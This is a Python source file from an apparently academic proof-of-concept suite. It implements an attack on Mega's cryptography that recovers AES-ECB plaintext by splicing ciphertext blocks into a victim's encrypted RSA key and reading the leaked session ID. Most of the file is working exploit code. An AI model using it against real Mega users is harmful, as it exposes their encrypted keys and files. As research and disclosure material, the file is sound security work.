
#
# This file is part of the PoCs for various issues found in the cryptographic
# design of Mega.
#
# Content: class implementing the AES-ECB plaintext recovery attack (used for
#  both the abstract example and the MITM PoC)
#

from shared.mega_simulation import *
from shared.attack_utils import *
from shared.constants.mega_crypto import *

class MegaAesEcbPlaintextRecoveryAttack():
    """

    ###########
    # Setting #
    ###########

    Given: pk, sk
    Goal: Find pt_i = AES_ECB.Dec(k_M, ct_i) for i ciphertexts

    Let n, e = pk; modulus n, public exponent e
    Let q, p, d, u = sk; prime factors p, q of n (i.e., n = pq), secret
        exponent d = e^-1 mod phi(n), u = q^-1 mod p

    Encrypted sk (under master key k_M):
    -----------------------------------------------------------------------------
    | |q| |    q    | |p| |    p    | |d| |        d        | |u| |    u    |///|
    -----------------------------------------------------------------------------

    Where |//| is padding to make csk a multiple of the AES block size.

    Split u = u0 || u1 || u2
        - u0 contains possibly some bytes of d, |u| and the first bytes of u
          (for RSA-2048 and standard sizes, 8 bytes of u, 6 bytes of d,
          2 bytes for |u|)
        - u1 of the size of the target ciphertext
        - u2 the remaining bits of u and the padding

    We can supply the client with a SID encrypted under the public key, and the
    encrypted private key csk of our choosing. The client decrypts csk and (if
    this succeeds), return the decrypted session ID to us. The session ID
    decryption works as follows:

    RSA-CRT decryption of c = m^e mod N for m = pad(sid):
        m_p = c^(d_p) mod p
        m_q = c^(d_q) mod q
        t = (m_p - m_q) mod p
        h = (t * u) mod p
        m' = h * q + m_q
        return m'[2:45]

    ##########
    # Attack #
    ##########

    We inject the target ciphertext blocks as follows in the encrypted secret key csk:
    ---------------------------------------------------------------------------
    | |q| |    q    | |p| |    p    | |d| |        d        | u0 |  x  |  u2  |
    ---------------------------------------------------------------------------
    Where x is the plaintext that we want to recover for the injected ciphertexts
    (this operation is performed entirely on the AES ECB ciphertext blocks, but
    displayed here on the decrypted key block to make it easier to understand).

    Let u' = u0 || x || u2.

    Furthermore, we choose m such that
        - m_p = 1
        - m_q = 0
    Then, RSA-CRT returns m' = (u' mod p) * q (before truncation).

    We observe, that without truncation we have m'/q = (u' mod p). Since u < p,
    u' < p w.h.p. and thus m'/q recovers u' including x. However, the client
    only returns a truncation of m'.

    Let m' = y0 || y1 || y2
        - y0 contains the unknown prefix byte
        - y1 is the 43 byte SID that is returned
        - y2 is the unknown suffix of m'

    For all y0, we try:
        - approx_u = ceil( (y0 || y1) * 2^y2.bit_length() / q)
        - if approx_u_p = u0 || x || ...
            - We found the correct prefix y0, because approx_u_p is an
              approximation of u' with the correct prefix u0
            - x is the decryption of the target ciphertext ct

    Details on the probability of success (> 1 - 2^40 in the Mega case with
    RSA-2048) and the last step are in the thesis.

    """

    def __init__(self, pk, sk, do_ct_len_encode=True):
        """
        :param pk: public key of the format (n, e) for modulus n and public
            exponent e
        :param sk: secret key of the format (q, p, d, u) for the prime factors
            p, q of n, d = e^-1 mod phi(n), and u = q^-1 mod p.
        :param do_ct_len_encode: optional Boolean, if set, do length encoding on
            ciphertext
        """

        self.pk = pk
        self.sk = sk
        self.do_ct_len_encode = do_ct_len_encode
        self.local_sid_decryption = False
        self.oracle_queries = 0

        n, e = self.pk
        q, p, d, u = self.sk

        # Calculate padding and position of AES blocks
        csk_key_len =  4 * LEN_ENCODING_BYTE_LEN + byte_length(q) + byte_length(p) \
            + byte_length(d) + byte_length(u)
        csk_pad_len = pad_len(csk_key_len, AES_BLOCK_BYTE_SIZE)
        if csk_pad_len <= 0:
            raise ValueError("The attack is not implemented to work without padding "
                "of the encoded secret key. It could be extended though.")

        self.u0_len = (AES_BLOCK_BYTE_SIZE - csk_pad_len) * 8

        # Calculate how many AES blocks we can decrypt in a single query
        ct_aes_blocks_cnt = 1
        while True:
            x_len = ct_aes_blocks_cnt * AES_BLOCK_BIT_SIZE
            u2_len = byte_length(p) * 8 - self.u0_len - x_len
            y2_len = byte_length(n) * 8 - PREFIX_MAX_BIT_LEN - SID_BIT_LEN
            if u2_len < y2_len - (q.bit_length() - 1):
                ct_aes_blocks_cnt -= 1
                break
            ct_aes_blocks_cnt += 1
        self.max_ct_aes_blocks = ct_aes_blocks_cnt

    def get_bogus_csk(self, csk, ct):
        """
        Get the manipulated encrypted secret key that replaces some blocks of u
        with the ciphertexts in ct whose decryption is to be recovered later.

        :param csk: secret key encrypted with AES ECB under the master key
        :param ct: ciphertexts to decrypt. For RSA-2048, two ciphertexts can be
            decrypted in a single query.
        :returns: manipulated encrypted secret key
        """

        q, p, d, u = self.sk
        n, e = self.pk

        if len(ct) % AES_BLOCK_BYTE_SIZE != 0:
            raise ValueError("Invalid ciphertexts, must be AES block-sized chunks.")

        ct_aes_blocks_cnt = ceil_int_div(len(ct), AES_BLOCK_BYTE_SIZE)
        if ct_aes_blocks_cnt > self.max_ct_aes_blocks:
            raise ValueError("Ciphertexts exceed the decryption capabilities of "
                f"this oracle (maximum {self.max_ct_aes_blocks} AES ciphertext blocks).")

        u_aes_size = ceil_int_div(byte_length(u), AES_BLOCK_BYTE_SIZE) * AES_BLOCK_BYTE_SIZE

        # Replace first blocks of u with target ciphertexts, which only contains
        # bits from u, with the target ciphertexts.
        csk_p = csk[:-u_aes_size] + ct + csk[-u_aes_size + len(ct):]

        # Store lengths for later
        self.x_len = len(ct) * 8
        self.u2_len = byte_length(p) * 8 - self.u0_len - self.x_len

        return csk_p

    def get_special_sid(self):
        """
        Get the SID corresponding to the message m with the properties:
            m_p = m (mod p) = 1
            m_q = m (mod q) = 0

        :returns: encryption of a message m s.t.
            - m mod p = 1
            - m mod q = 0
        """
        q, p, d, u = self.sk
        m = int_to_bytes(u * q)
        return rsa_encrypt(m, self.pk, do_pad=False, do_ct_len_encode=self.do_ct_len_encode)

    def recover_pt(self, sid):
        """
        Recover the decryption of the target ciphertext blocks based on the
        returned SID.

        :param sid: response SID from the client as integer

        :return: plaintext as bytes
        """

        self.oracle_queries += 1
        q, p, d, u = self.sk
        n, e = self.pk

        u0 = u >> (self.u2_len + self.x_len)

        for prefix_bit_len in range(PREFIX_MIN_BIT_LEN, PREFIX_MAX_BIT_LEN+1, 8):
            y2_len = byte_length(n) * 8 - prefix_bit_len - SID_BIT_LEN

            for y0 in range(1 << prefix_bit_len):
                prefix = bytes_to_int(int_to_bytes(y0) + sid)
                approx_u_p = ceil_int_div((prefix << y2_len), q) >> self.u2_len

                if approx_u_p >> self.x_len == u0:
                    x_byte_len = ceil_int_div(self.x_len, 8)
                    pts = int_to_bytes(approx_u_p)[-x_byte_len:]
                    return pts.rjust(ceil_int_div(x_byte_len, 8))

        raise ValueError("Failed to recover plaintext!")

    def store_real_csid(self, csid):
        """
        Store the csid returned by the server for authenticating later

        :param csid: encrypted session ID
        """

        self.real_csid = csid
        self.local_sid_decryption = True
